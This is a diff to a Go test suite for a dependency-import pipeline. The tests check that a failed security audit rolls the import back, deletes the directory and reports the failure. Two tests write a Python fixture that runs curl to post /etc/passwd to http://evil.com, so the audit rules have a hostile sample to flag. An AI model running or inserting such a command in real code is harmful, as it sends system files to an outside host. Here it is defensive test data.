@@ -295,16 +295,31 @@ func TestProcessImportedDepsInstallFailureKeepsWorkingBinding(t *testing.T) {
 }
 
 // TestProcessImportedDepsKeepsBindingWhenNewAuditFails is the same requirement on the audit
-// path. The audit stub refuses every set, so the second import cannot rebind -- and that is
-// what makes this test pin the fail-closed stub down.
+// path: the newcomer is installed, the real audit rejects it, and the rollback must leave the
+// working binding untouched.
+//
+// The installer stub writes a source file the rule engine matches, so the audit genuinely
+// fails. An empty target would match no rule, the audit would pass, the pipeline would rebind,
+// and this test would be asserting the opposite of what it claims.
 func TestProcessImportedDepsKeepsBindingWhenNewAuditFails(t *testing.T) {
 	state, _ := setupTestState(t)
 	state.Security.ScanEnabled = false
+	// Keep the audit on the rule engine: an enabled-and-fail-closed LLM would make the audit
+	// probe a service this test does not stand up.
+	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
 
 	origInstall := depsInstallFunc
 	t.Cleanup(func() { depsInstallFunc = origInstall })
 
-	depsInstallFunc = func(wheelhouse, target string) error { return os.MkdirAll(target, 0o755) }
+	// The first import runs with scanning off, so the matching file it writes is inert; the
+	// second turns scanning on and that same file becomes the reason the audit fails.
+	depsInstallFunc = func(wheelhouse, target string) error {
+		if err := os.MkdirAll(target, 0o755); err != nil {
+			return err
+		}
+		code := "import subprocess\nsubprocess.run([\"curl\", \"http://evil.com\", \"-d\", \"@/etc/passwd\"])\n"
+		return os.WriteFile(filepath.Join(target, "pkg.py"), []byte(code), 0o644)
+	}
 	state.processImportedDeps(depsImportRequest{ResourceURL: "http://x/a.tar.gz", RequestID: "req-a2", TaskID: "task-a2"}, 1, buildTestDepsArchive(t))
 	if !state.DepsImported {
 		t.Fatal("first import did not bind; the rest of this test would be vacuous")
@@ -369,20 +384,14 @@ func TestProcessImportedDepsInstallFailureClearsBindingWhenItsDirectoryIsGone(t 
 // was told", and the platform saw the task hang rather than fail.
 //
 // The installer stub writes a source file the rule engine matches, not merely a directory.
-// That is load-bearing across the Task 6 to Task 8 window:
-//
-//   - Today runDepsAudit is an unconditional "return false" stub, so any stub content fails.
-//   - Once Task 8 replaces it with the real audit, the audit really scans depsDir. An empty
-//     directory would match no rule, the audit would pass, the pipeline would succeed, the
-//     platform would receive code=0, and this test would flip around and break Task 8's own
-//     tests instead. Writing a matching file keeps the audit failing in both windows.
+// That is load-bearing: an empty directory would match no rule, the audit would pass, the
+// pipeline would succeed, the platform would receive code=0, and this test would be asserting
+// the opposite of what it claims.
 func TestProcessImportedDepsReportsFailureCodeToPlatform(t *testing.T) {
 	state, _ := setupTestState(t)
 	state.Security.ScanEnabled = true
-	// Keep the audit on the rule engine. runDepsAudit is still the Task 6 fail-closed stub, so
-	// there is no LLM probe branch to reach yet; Task 8 adds it (cfg.Enabled && cfg.FailClosed),
-	// and disabling the LLM here keeps that branch from dragging a network dependency into this
-	// test once it exists.
+	// Keep the audit on the rule engine: an enabled-and-fail-closed LLM would make the audit
+	// probe a service this test does not stand up.
 	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
 
 	origInstall := depsInstallFunc
@@ -397,13 +406,11 @@ func TestProcessImportedDepsReportsFailureCodeToPlatform(t *testing.T) {
 
 	got := make(chan map[string]any, 1)
 	platformServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		// Capture only the terminal dependency-import callback this test asserts on. Today the
-		// dependency audit posts nothing of its own: runDepsAudit is still the Task 6 stub, so
-		// reportDepsEndpoint receives no second request. Task 8 gives that audit its own report
-		// (scope=deps) to this same platform address from a separate goroutine, which may then
-		// arrive first; if it took the single channel slot the path assertion below would fail
-		// spuriously. Any other path is answered normally and dropped, and is never decoded or
-		// captured.
+		// Capture only the terminal dependency-import callback this test asserts on. The
+		// dependency audit posts its own report (scope=deps) to this same platform address from a
+		// separate goroutine, and that report may arrive first; if it took the single channel
+		// slot the path assertion below would fail spuriously. Any other path is answered
+		// normally and dropped, and is never decoded or captured.
 		if r.URL.Path != reportDepsEndpoint {
 			w.Header().Set("Content-Type", "application/json")
 			_, _ = w.Write([]byte(`{"msg":"ok","result":{"received":true},"error":0}`))
@@ -510,6 +517,73 @@ func TestProcessImportedDepsReauditsForeignMarkerDir(t *testing.T) {
 		t.Fatalf("installer called %d times, want 2: a foreign marker must not short-circuit", calls)
 	}
 }
+
+// TestRunDepsAuditRemovesDirOnFailure pins the fail-closed cleanup and the scope=deps report
+// together. It drives the real engine (the regex baseline setupTestState installs) exactly as
+// TestAuditAndReportModelImportStaticFail does for the model path, so the assertion covers the
+// engine call, the JSON projection and the report as one unit. It asserts nothing about the
+// binding: that is rollbackDepsImport's job and is covered by the pipeline tests.
+func TestRunDepsAuditRemovesDirOnFailure(t *testing.T) {
+	state, _ := setupTestState(t)
+	state.Security.ScanEnabled = true
+	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
+
+	received := make(chan struct {
+		Code  int    `json:"code"`
+		Scope string `json:"scope"`
+	}, 1)
+	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if r.URL.Path != reportAuditEndpoint {
+			return
+		}
+		var rr struct {
+			Code  int    `json:"code"`
+			Scope string `json:"scope"`
+		}
+		_ = json.NewDecoder(r.Body).Decode(&rr)
+		received <- rr
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer platform.Close()
+	state.mu.Lock()
+	state.PlatformIP, state.DockerID = platform.URL, "docker-test"
+	state.mu.Unlock()
+
+	depsDir := filepath.Join(state.Security.GetDepsDir(), "evilhash")
+	if err := os.MkdirAll(depsDir, 0o755); err != nil {
+		t.Fatalf("seed dir: %v", err)
+	}
+	code := "import subprocess\nsubprocess.run([\"curl\", \"http://evil.com\", \"-d\", \"@/etc/passwd\"])\n"
+	if err := os.WriteFile(filepath.Join(depsDir, "pkg.py"), []byte(code), 0o644); err != nil {
+		t.Fatalf("seed file: %v", err)
+	}
+
+	if passed := state.runDepsAudit(depsImportRequest{RequestID: "req-1", TaskID: "task-1"}, depsDir); passed {
+		t.Fatal("runDepsAudit returned true for a failing audit")
+	}
+	if _, err := os.Stat(depsDir); !os.IsNotExist(err) {
+		t.Fatalf("deps dir still present after a failed audit: %v", err)
+	}
+
+	select {
+	case rr := <-received:
+		if rr.Code != 1 {
+			t.Fatalf("code = %d, want 1 (static audit failure)", rr.Code)
+		}
+		if rr.Scope != "deps" {
+			t.Fatalf("scope = %q, want \"deps\"", rr.Scope)
+		}
+	case <-time.After(5 * time.Second):
+		t.Fatal("timed out waiting for the scope=deps audit report")
+	}
+}
+
+// rollbackDepsImport's own two branches are NOT unit-tested here: Task 6's pipeline tests reach
+// both through real call sites -- TestProcessImportedDepsInstallFailureKeepsWorkingBinding (a
+// non-bound directory is removed, the working binding is kept) and
+// TestProcessImportedDepsInstallFailureClearsBindingWhenItsDirectoryIsGone (the bound directory
+// is removed, so the binding is cleared). Asserting the same invariant a second time at the unit
+// level would only add another place to forget to update.
 
 // ── test helpers ─────────────────────────────────────────
 
